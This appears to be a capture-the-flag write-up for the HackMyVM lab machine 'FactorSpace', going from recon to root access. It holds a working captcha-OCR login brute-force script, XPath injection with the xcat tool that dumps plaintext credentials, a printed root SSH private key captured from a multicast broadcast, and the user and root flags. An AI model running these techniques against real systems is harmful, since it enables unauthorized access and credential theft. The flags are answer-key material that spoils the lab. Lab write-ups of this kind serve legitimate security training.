# FactorSpace

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.165:22
Open 10.0.2.165:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.165
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-title: industrial
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/factorspace/writeup.png)

```bash
â””â”€$ feroxbuster -u http://10.0.2.165 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Nothing
â””â”€$ curl http://10.0.2.165 -s | grep '<!--'
# Nothing
â””â”€$ curl http://10.0.2.165 -s | htmlq '*' -a src | sort | uniq
# Nothing
â””â”€$ curl http://10.0.2.165 -s | htmlq '*' -a href | sort | uniq
# Nothing
```

Add `.php` extension
```bash
â””â”€$ feroxbuster -u http://10.0.2.165 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        0l        0w        0c http://10.0.2.165/auth.php
302      GET        0l        0w        0c http://10.0.2.165/check.php => login.php
301      GET        9l       28w      308c http://10.0.2.165/fonts => http://10.0.2.165/fonts/
301      GET        9l       28w      307c http://10.0.2.165/icon => http://10.0.2.165/icon/
301      GET        9l       28w      309c http://10.0.2.165/images => http://10.0.2.165/images/
200      GET      371l     1318w    19579c http://10.0.2.165/index.html
200      GET    18950l    75725w   918708c http://10.0.2.165/js/plugin.js
200      GET      373l     1221w     9871c http://10.0.2.165/js/custom.js
200      GET      371l     1318w    19579c http://10.0.2.165/
301      GET        9l       28w      305c http://10.0.2.165/js => http://10.0.2.165/js/
200      GET       67l      145w     2346c http://10.0.2.165/login.php
302      GET        8l       12w      115c http://10.0.2.165/results.php => login.php
```

### Bruteforce Login

ðŸ˜”

![writeup-1.png](/assets/pentest/hackmyvm/factorspace/writeup-1.png)

```python
from io import BytesIO
from PIL import Image
from requests import Session
import pytesseract
import string
import sys

USERNAME = 'admin'
URL = 'http://10.0.2.165/auth.php'
CHARSET = string.ascii_letters + string.digits

def get_captcha(session, password):
    resp = session.get(URL, params={'generate_captcha': '1'})
    img = Image.open(BytesIO(resp.content))
    text = pytesseract.image_to_string(img, lang='eng', config=f'--psm 6 --oem 3 -c tessedit_char_whitelist={CHARSET}')
    return text.strip()

def login(session, username, password, captcha):
    resp = session.post(URL, data={
        'username': username,
        'password': password,
        'captcha': captcha
    })
    return len(resp.content) != 2346

with open(sys.argv[1]) as f, Session() as session:
    for password in f:
        password = password.strip()
        captcha = get_captcha(session, password)
        if login(session, USERNAME, password, captcha):
            print(f'[+] Success - {USERNAME}:{password}:{captcha}')
            break
        else:
            print(f'[-] Fail - {USERNAME}:{password}:{captcha}')
```

```bash
â””â”€$ py /media/sf_VBoxShare/t.py $rockyou
[-] Fail - admin:123456:9FUAX
[-] Fail - admin:12345:yn3VK
[-] Fail - admin:123456789:Te45B
[-] Fail - admin:password:JnB5w
[+] Success - admin:iloveyou:kney4
```

::: info Note
The **tesseract** is not perfect, may fail to identify correct password depending on captcha complexity..
:::

### XPATH Injection

![writeup-2.png](/assets/pentest/hackmyvm/factorspace/writeup-2.png)

![writeup-3.png](/assets/pentest/hackmyvm/factorspace/writeup-3.png)

It's possible to inject arbitrary values

![writeup-4.png](/assets/pentest/hackmyvm/factorspace/writeup-4.png)

I was not able to identify the vulnerability myself so I searched payloads. It can't be CSV, I tried SQLi payloads but nothing, XSS what? self?, XXE not suitable, CRLF/LDAP/SAML/XSLT/LaTeX/NoSQL same. When trying XPATH payload I got output back.

![writeup-5.png](/assets/pentest/hackmyvm/factorspace/writeup-5.png)

![writeup-6.png](/assets/pentest/hackmyvm/factorspace/writeup-6.png)

For SQLi I tested `' OR '1'='1` and it didn't work, only lowercase `or` works.

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
- [https://blog.1nf1n1ty.team/hacktricks/pentesting-web/xpath-injection](https://blog.1nf1n1ty.team/hacktricks/pentesting-web/xpath-injection)

Use auto exploit tool like `xcat` (getting to use this took way too long..)
```bash
docker build -t xcat https://github.com/orf/xcat.git#master
docker run -it --network host -v $(pwd):/tmp xcat run http://10.0.2.165/results.php lastname lastname=Doe -m POST -h /tmp/headers --true-string 'John' -e FORM # --tamper /tmp/logger.py
```

If you want to inspect what payloads it tries:
```python
â””â”€$ cat logger.py
def tamper(context, payload, **kwargs):
    print(f'Payload: {payload}')
    return context
```

::: info Note
I think you can pipe all requests through burp with `-e http_proxy=http://BURP_HOST:BURP_PORT` (docker)
:::

```xml
<users>
    <user>
        <lastname>Doe</lastname>
        <firstname>John</firstname>
        <email>john.doe@factorspace.hmv</email>
        <password>secret123</password>
    </user>
    <user>
        <lastname>John</lastname>
        <firstname>Jackie</firstname>
        <email>jackie.chan@factorspace.hmv</email>
        <password>qyxG27KGkW0x9SJ1</password>
    </user>
    <user>
        <lastname>Lee</lastname>
        <firstname>David</firstname>
        <email>david.lee@example.com</email>
        <password>qwerty789</password>
    </user>
</users>
```

## SSH

::: info Note
`jackie:qyxG27KGkW0x9SJ1`
:::

```bash
â””â”€$ sshpass -p 'qyxG27KGkW0x9SJ1' ssh jackie@10.0.2.165
jackie@factorspace:~$ id
uid=1000(jackie) gid=1000(jackie) groups=1000(jackie)
```

Source  code for XPATH
```php
jackie@factorspace:/var/www/html$ cat results.php
<!DOCTYPE html>
<html>
<head>
    <title>Name Search Results</title>
</head>
<body>
    <h1>Name Search Results</h1>
    <?php
    include('check.php');
    $lastname = $_POST['lastname'];
    $xml = simplexml_load_file('employee_info_2023.xml');
    $results = $xml->xpath("//user[lastname='$lastname']/firstname");
    if (count($results) > 0) {
        echo "<p>The matching first names for the last name \"$lastname\" are:</p>";
        echo "<ul>";
        foreach ($results as $firstname) { echo "<li>$firstname</li>"; }
        echo "</ul>";
    } else {
        echo "<p>No results found for the last name \"$lastname\".</p>";
    }
    ?>
</body>
</html>
```

### User.txt

```bash
jackie@factorspace:~$ cat user.txt
eb7d964a2a41006bb325cf822db664be
```

## Privilege Escalation

Some odd UDP port is open on 5555
```bash
jackie@factorspace:/$ ss -tunlp4
Netid   State    Recv-Q   Send-Q       Local Address:Port       Peer Address:Port   Process
udp     UNCONN   0        0                224.1.1.1:5555            0.0.0.0:*
udp     UNCONN   0        0                  0.0.0.0:68              0.0.0.0:*
tcp     LISTEN   0        128                0.0.0.0:22              0.0.0.0:*
```

That port is a **Multicast** address (`224.1.1.1`). Think of it like a radio station: a process is "broadcasting" data to anyone on the local network who tunes in to that specific frequency.

![writeup-7.png](/assets/pentest/hackmyvm/factorspace/writeup-7.png)

```bash
â””â”€$ socat - UDP4-RECVFROM:5555,ip-add-membership=224.1.1.1:0.0.0.0 | tee id_rsa.root
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY----- 
â””â”€$ echo >> id_rsa.root
â””â”€$ chmod 600 id_rsa.root
â””â”€$ ssh -i id_rsa.root root@10.0.2.165
root@factorspace:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Alternatively you can just use **Wireshark**

![writeup-8.png](/assets/pentest/hackmyvm/factorspace/writeup-8.png)

### Root.txt

```bash
root@factorspace:~# cat root.txt
052cf26a6e7e33790391c0d869e2e40c
```
